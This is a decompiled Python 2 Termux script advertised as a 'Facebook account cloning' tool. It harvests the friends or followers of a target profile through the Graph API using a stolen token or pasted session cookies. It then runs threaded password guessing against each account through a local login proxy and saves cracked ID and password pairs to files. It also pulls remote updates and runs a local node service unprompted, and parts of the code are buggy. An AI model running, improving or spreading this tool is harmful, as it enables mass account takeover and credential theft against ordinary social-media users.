# Decompiled By Yousuf
# Github : Yousuf
# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Mar 20 2021, 14:59:33) 
# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
# Embedded file name: dg
import os, sys, time, datetime, re, threading, json, random, requests, hashlib, cookielib, uuid
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
__author__ = 'Yousuf'
__copyright = 'All rights reserved . Copyright  ranamz'
os.system('termux-setup-storage')
try:
    os.mkdir('/sdcard/ids')
except OSError:
    pass

bd = random.randint(20000000.0, 30000000.0)
sim = random.randint(20000.0, 40000.0)
bd = random.randint(20000000.0, 30000000.0)
sim = random.randint(20000, 40000)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 
   'x-fb-net-hni': repr(sim), 
   'x-fb-connection-quality': 'EXCELLENT', 
   'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
   'user-agent': 'Mozilla/5.0 (Linux; U; Android 10; th-th; V2027 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36 PHX/9.7 ;]', 
   'content-type': 'application/x-www-form-urlencoded', 
   'x-fb-http-engine': 'Liger'}
os.system('git pull')
os.system('clear')
c = '\x1b[1;32m\x1b[0;97m\x1b[1;32m'
c2 = '\x1b[0;97m\x1b[1;32m\x1b[0;97m'
c3 = '\x1b[1;31m\x1b[0;97m\x1b[1;31m'
os.system('git pull')
os.system('clear')
logo = """
                                                  
 _      _____  ___    _____  ___   
( )    (  _  )(  _`\ (  _  )|  _`\ 
| |    | ( ) || (_(_)| (_) || (_) )
| |  _ | | | ||  _)  |  _  || ,  / 
| |_( )| (_) || |    | | | || |\ \ 
(____/'(_____)(_)    (_) (_)(_) (_)
                                                                     
                                                                                                                              
\033[37;1m[\033[41;1m FACEBOOK ACCOUNT CLONING \033[00;1m\033[37;1m ]\n
\033[37;1m[\033[41;1m BY (YOUSUF)LOFAR_SHAHZADI \033[00;1m\033[37;1m ]\n

 \033[32;1mCREATOE \033[37;1m: \033[33;1mLOFAR

 \033[32;1mVERSION \033[37;1m: \033[33;1m1.0

"""

def reg():
    os.system('clear')
    print logo
    print ''
    print '\x1b[1;37;1mNO NEED APPROVAL ENJOY FREE'
    print ''
    time.sleep(1)
    try:
        to = open('/sdcard/.Free.txt', 'r').read()
    except (KeyError, IOError):
        reg2()

    r = requests.get('https://raw.githubusercontent.com/brandbukhari/Updated-Tool/main/server.txt').text
    if to in r:
        os.system('cd ..... && npm install')
        os.system('fuser -k 5000/tcp &')
        os.system('#')
        os.system('cd ..... && node index.js &')
        time.sleep(5)
        ip()
    else:
        os.system('clear')
        print logo
        print ''
        print '\tAPPROVED FAILED'
        print ''
        print ' \x1b[1;92mYOUR ID IS NOT APPROVED '
        print ''
        print ' \x1b[1;92mCOPY TOKEN ID AND SEND WHATSAPP'
        print ''
        print ' \x1b[1;92mYOUR ID: ' + to
        print ''
        raw_input('\x1b[1;93m PRESS ENTER TO SEND ID')
        os.system('xdg-open  https://chat.whatsapp.com/GJjqaCfPgnlFQpALZqd6hx')
        reg()


def reg2():
    os.system('clear')
    print logo
    print ''
    print '\tAPPROVAL NOT DETECTED'
    print ''
    print ' \x1b[1;92mCOPY AND PRESS ENTER , AND SEND WHATSAPP'
    print ''
    id = uuid.uuid4().hex[:50]
    print ' Your id: ' + id
    print ''
    print ''
    raw_input(' PRESS ENTER TO GO TO FACEBOOK ')
    os.system('xdg-open https://chat.whatsapp.com/GJjqaCfPgnlFQpALZqd6hx')
    sav = open('/sdcard/.ranamz.txt', 'w')
    sav.write(id)
    sav.close()
    raw_input('\x1b[1;92m PRESS ENTER TO CHECK APPROVAL ')
    reg()


def ip():
    os.system('clear')
    print logo
    print ''
    print '\tCOLLECTING DEVICE INFO'
    print ''
    try:
        ipinfo = requests.get('http://ip-api.com/json/')
        z = json.loads(ipinfo.text)
        ips = z['query']
        country = z['country']
        regi = z['regionName']
        network = z['isp']
    except:
        pass

    print '\x1b[1;92m YOUR IP: ' + ips
    time.sleep(2)
    print ''
    print '\x1b[1;92m YOUR COUNTRY: ' + country
    time.sleep(2)
    print ''
    print '\x1b[1;92m YOUR REGION: ' + regi
    time.sleep(2)
    print ''
    print ' \x1b[1;92mYOUR NETWORK: ' + network
    time.sleep(1)
    print ''
    print ' Loading ...'
    time.sleep(1)
    log_menu()


def log_menu():
    try:
        t_check = open('access_token.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print ''
        print '\x1b[1;31;1m LOGIN MENU'
        print ''
        print '\x1b[1;92m[1] LOGIN WITH FaceBook'
        print '\x1b[1;92m[2] LOGIN WITH TOKEN'
        print '\x1b[1;92m[3] LOGIN WITH COOKIES'
        print ''
        log_menu_s()


def log_menu_s():
    s = raw_input(' \x1b[1;93m\xe2\x95\xb0\xe2\x94\x80LOFAR\xe2\x9e\xa4 ')
    if s == '1':
        log_fb()
    elif s == '2':
        log_token()
    elif s == '3':
        log_cookie()
    else:
        print ''
        print '\\ Select valid option '
        print ''
        log_menu_s()


def log_fb():
    os.system('clear')
    print logo
    print ''
    print '\x1b[1;31;1mLOGIN WITH ID/PASS'
    print ''
    lid = raw_input('\x1b[1;92m Id/mail/no: ')
    pwds = raw_input(' \x1b[1;93mPassword: ')
    try:
        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pwd).text
        q = json.loads(data)
        if 'loc' in q:
            ts = open('access_token.txt', 'w')
            ts.write(q['loc'])
            ts.close()
            menu()
        elif 'www.facebook.com' in q['error']:
            print ''
            print ' USER MUST VERIFY ACCOUNT BEFORE LOGIN'
            print ''
            raw_input('\x1b[1;92m PRESS ENTER TO TRY AGAIN ')
            log_fb()
        else:
            print ''
            print ' Id/PASS MAY BE WRONG'
            print ''
            raw_input(' \x1b[1;92mPRESS ENTER TO TRY AGAIN ')
            log_fb()
    except:
        print ''
        print 'Exiting tool'
        os.system('exit')


def log_token():
    os.system('clear')
    print logo
    print ''
    print '\x1b[1;97mLOGIN WITH TOKEN'
    print ''
    tok = raw_input(' \x1b[1;92mPASTE TOKEN HERE: ')
    print ''
    t_s = open('access_token.txt', 'w')
    t_s.write(tok)
    t_s.close()
    menu()


def log_cookie():
    os.system('clear')
    print logo
    print ''
    print '\x1b[1;37;1mLOGIN COOKIES'
    print ''
    try:
        cookie = raw_input(' Paste cookies here: ')
        data = {'user-agent': 'Mozilla/5.0 (Linux; U; Android 10; th-th; V2027 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36 PHX/9.7', 'referer': 'https://m.facebook.com/', 
           'host': 'm.facebook.com', 
           'origin': 'https://m.facebook.com', 
           'upgrade-insecure-requests': '1', 
           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
           'cache-control': 'max-age=0', 
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
           'content-type': 'text/html; charset=utf-8', 
           'cookie': cookie}
        c1 = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers=data)
        c2 = re.search('(EAAA\\w+)', c1.text)
        hasil = c2.group(1)
        ok = open('access_token.txt', 'w')
        ok.write(hasil)
        ok.close()
        menu()
    except AttributeError:
        print ''
        print '\tInvalid cookies'
        print ''
        raw_input(' \x1b[1;92mPRESS ENTER TO TRY AGAIN ')
        log_menu()
    except UnboundLocalError:
        print ''
        print '\tInvalid cookies'
        print ''
        raw_input(' \x1b[1;92mPRESS ENTER TO TRY AGAIN ')
        log_menu()
    except requests.exceptions.SSLError:
        print ''
        print '\tInvalid cookies'
        print ''
        raw_input(' \x1b[1;92mPRESS ENTER TO TRY AGAIN ')
        log_menu()


def menu():
    os.system('clear')
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        print ''
        print logo
        print ''
        print '\x1b[1;37;1mLOGIN FB ID TO CONTINUE'
        print ''
        time.sleep(1)
        log_menu()

    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + token)
        q = json.loads(r.text)
        z = q['name']
    except (KeyError, IOError):
        print logo
        print ''
        print '\t ACCOUNT CHECKPOINT\x1b[0;97m'
        print ''
        os.system('rm -rf access_token.txt')
        time.sleep(1)
        log_menu()
    except requests.exceptions.ConnectionError:
        print logo
        print ''
        print '\t TURN ON MOBILE DATA/WIFI\x1b[0;97m'
        print ''
        raw_input(' \x1b[1;92mPRESS ENTER AFTER TURNING ON MOBILE DATA/WIFI ')
        menu()

    os.system('clear')
    print logo
    tok = open('/sdcard/.Free.txt', 'r').read()
    print ''
    print '  \x1b[1;92mLOGGED IN USER: ' + z
    print ''
    print ' \x1b[1;93m ACTIVE TOKEN: ' + tok
    print ''
    print ' ------------------------------------------ '
    print ''
    print '\x1b[1;97m[1] START CLONING'
    print '\x1b[1;97m[2] MAKE FILE'
    print '\x1b[1;97m[3] VIEW TOKEN'
    print '\x1b[1;97m[4] LOGOUT'
    print '\x1b[1;97m[5] DELETE TRASH FILES'
    print ''
    menu_s()


def menu_s():
    ms = raw_input('\x1b[1;92m\xe2\x95\xb0\xe2\x94\x80LOFAR\xe2\x9e\xa4 ')
    if ms == '1':
        auto_crack()
    elif ms == '2':
        os.system('clear')
        print '[!] PLEASE WAIT WHILE PAGE IS LOADING.'
        os.system('python2 LofarFileMake.sos')
        time.sleep(1)
    elif ms == '3':
        v_tok()
    elif ms == '4':
        lout()
    elif ms == '5':
        rtrash()
    else:
        print ''
        print '\tSelect valid option'
        print ''
        menu_s()


def crack():
    global toket
    try:
        toket = open('login.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\t File Not Found \x1b[0;97m'
        print ''
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print ''
    print '\033[37;1m[\033[33;1m LOFAR SHAHZADI CLONING TOOL MENU \033[00;1m\033[33;1m ]\n'
    print ''
    print '\x1b[1;97m[1] PUBLIC ID CLONING'
    print '\x1b[1;97m[2] FOLLOWERS CLONING'
    print '\x1b[1;97m[3] FILE CLONING'
    print '\x1b[1;97m[0] BACK'
    print ''
    a_s()


def auto_crack():
    global token
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\t LOGIN FB ID TO CONTINUE\x1b[0;97m'
        print ''
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print ''
    print '\x1b[1;33;1m LOFAR SHAHZADI CLONING TOOL MENU '
    print ''
    print '\x1b[1;97m[1] PUBLIC ID CLONING'
    print '\x1b[1;97m[2] FOLLOWERS CLONING'
    print '\x1b[1;97m[3] FILE CLONING'
    print '\x1b[1;97m[0] BACK'
    print ''
    a_s()


def a_s():
    id = []
    cps = []
    oks = []
    a_s = raw_input(' \x1b[1;93m\xe2\x95\xb0\xe2\x94\x80LOFAR\xe2\x9e\xa4 ')
    if a_s == '1':
        os.system('clear')
        print logo
        print ''
        print '\x1b[1;31;1m CHOICE PASS PUBLIC CLONING '
        print ''
        print '\x1b[1;93m LIKE THIS: 123,1234,12345,786,12,1122'
        print ''
        p1 = raw_input('\x1b[1;97m[1] NAME + DIGIT: ')
        p2 = raw_input('\x1b[1;97m[2] NAME + DIGIT: ')
        p3 = raw_input('\x1b[1;97m[3] NAME + DIGIT: ')
        pass4 = raw_input('\x1b[1;97m[4] PASSWORD: ')
        pass5 = raw_input('\x1b[1;97m[5] PASSWORD: ')
        pass6 = raw_input('\x1b[1;97m[6] PASSWORD: ')
        pass7 = raw_input('\x1b[1;97m[7] PASSWORD: ')
        pass8 = raw_input('\x1b[1;97m[8] PASSWORD: ')
        idt = raw_input('\x1b[1;97m[\xe2\x98\x85]Enter id: ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print ''
            print '\x1b[1;31;1m CHOICE PASS PUBLIC CRACKING'
            print ''
            print ' \x1b[1;92mCLONING FROM: ' + z
        except (KeyError, IOError):
            print ''
            print '\t Invalid user \x1b[0;97m'
            print ''
            raw_input(' \x1b[1;92mPRESS ENTER TO TRY AGAIN ')
            auto_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif a_s == '2':
        os.system('clear')
        print logo
        print ''
        print '\x1b[1;31;1m CHOICE PASS FOLLOWERS CRACKING'
        print ''
        print ' \x1b[1;93mLIKE THIS: 123,1234,12345,786,12,1122'
        print ''
        p1 = raw_input('\x1b[1;97m[1] NAME + DIGIT: ')
        p2 = raw_input('\x1b[1;97m[2] NAME + DIGIT: ')
        p3 = raw_input('\x1b[1;97m[3] Name + DIGIT: ')
        pass4 = raw_input('\x1b[1;97m[4] PASSWORD: ')
        pass5 = raw_input('\x1b[1;97m[5] PASSWORD: ')
        pass6 = raw_input('\x1b[1;97m[6] PASSWORD: ')
        pass7 = raw_input('\x1b[1;97m[7] PASSWORD: ')
        pass8 = raw_input('\x1b[1;97m[8] PASSWORD: ')
        idt = raw_input(' \x1b[1;97m[\xe2\x98\x85]Enter id: ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print ''
            print '\x1b[1;31;1m CHOICE PASS FOLLOWERS CRACKING '
            print ' \x1b[1;92mCloning from: ' + z
        except (KeyError, IOError):
            print ''
            print '\t Invalid user \x1b[0;97m'
            print ''
            raw_input('\x1b[1;92mPRESS ENTER TO TRY AGAIN ')
            auto_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif a_s == '3':
        os.system('clear')
        print logo
        print ''
        print '\x1b[1;31;1m CHOICE PASS FILE CRACKING'
        print ''
        print '\x1b[1;93m LIKE THIS: 123,1234,12345,786,12,1122'
        print ''
        p1 = raw_input('\x1b[1;97m[1] NAME + DIGIT: ')
        p2 = raw_input('\x1b[1;97m[2] NAME + DIGIT: ')
        p3 = raw_input('\x1b[1;97m[3] Name + DIGIT: ')
        pass4 = raw_input('\x1b[1;97m[4] PASSWORD: ')
        pass5 = raw_input('\x1b[1;97m[5] PASSWORD: ')
        pass6 = raw_input('\x1b[1;97m[6] PASSWORD: ')
        pass7 = raw_input('\x1b[1;97m[7] PASSWORD: ')
        pass8 = raw_input('\x1b[1;97m[8] PASSWORD: ')
        try:
            idlist = raw_input('[+] File Name: ')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] FILE NOT FOUND.'
            raw_input('PRESS ENTER TO BACK. ')
            crack()

    elif a_s == '0':
        menu()
    else:
        print ''
        print '\tChoose valid option' + w
        print ''
        a_s()
    print ' Total ids: ' + str(len(id))
    time.sleep(0.5)
    print ' \x1b[1;93m CLONING START '
    time.sleep(0.5)
    print ''
    print 47 * '-'
    print '\t\x1b[1;32mSHAHZADI [LOFAR]\x1b[0;97m'
    print 47 * '-'
    print ''

    def main(arg):
        user = arg
        uid, name = user.split('|')
        try:
            pass1 = name.lower().split(' ')[0] + name.lower().split(' ')[1]
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;92m[OK] ' + uid + ' | ' + pass1
                ok = open('/sdcard/ids/LOFAR_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;97m[CP] ' + uid + ' | ' + pass1
                cp = open('LOFAR_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name.lower() + p2
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;92m[OK] ' + uid + ' | ' + pass2
                    ok = open('/sdcard/ids/LOFAR_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;97m[CP] ' + uid + ' | ' + pass2
                    cp = open('LOFAR_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name.lower() + p3
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;92m[OK] ' + uid + ' | ' + pass3
                        ok = open('/sdcard/ids/LOFAR_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;97m[CP] ' + uid + ' | ' + pass3
                        cp = open('LOFAR_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;92m[OK] ' + uid + ' | ' + pass4
                            ok = open('/sdcard/ids/LOFAR_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;97m[CP] ' + uid + ' | ' + pass4
                            cp = open('LOFAR_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
                        else:
                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;92m[OK] ' + uid + ' | ' + pass5
                                ok = open('/sdcard/ids/LOFAR_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '\x1b[1;97m[CP] ' + uid + ' | ' + pass5
                                cp = open('LOFAR_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.apppend(uid + pass5)
                            else:
                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers=header).text
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;92m[OK] ' + uid + ' | ' + pass6
                                    ok = open('/sdcard/ids/LOFAR_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[1;97m[CP] ' + uid + ' | ' + pass6
                                    cp = open('LOFAR_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.apppend(uid + pass6)
                                else:
                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers=header).text
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\x1b[1;92m[OK] ' + uid + ' | ' + pass7
                                        ok = open('/sdcard/ids/LOFAR_OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error']:
                                        print '\x1b[1;97m[CP] ' + uid + ' | ' + pass7
                                        cp = open('LOFAR_CP.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        cps.apppend(uid + pass7)
                                    else:
                                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass8, headers=header).text
                                        q = json.loads(data)
                                        if 'loc' in q:
                                            print '\x1b[1;92m[OK] ' + uid + ' | ' + pass8
                                            ok = open('/sdcard/ids/LOFAR_OK.txt', 'a')
                                            ok.write(uid + ' | ' + pass8 + '\n')
                                            ok.close()
                                            oks.append(uid + pass8)
                                        elif 'www.facebook.com' in q['error']:
                                            print '\x1b[1;97m[CP] ' + uid + ' | ' + pass8
                                            cp = open('LOFAR_CP.txt', 'a')
                                            cp.write(uid + ' | ' + pass8 + '\n')
                                            cp.close()
                                            cps.apppend(uid + pass8)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print ''
    print 47 * '-'
    print ''
    print ' \x1b[1;97mProcess Has Been Completed'
    print ' \x1b[1;97mTotal Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
    print ''
    print 47 * '-'
    print ''
    raw_input(' \x1b[1;93mPress enter to back')
    auto_crack()


if __name__ == '__main__':
    reg()
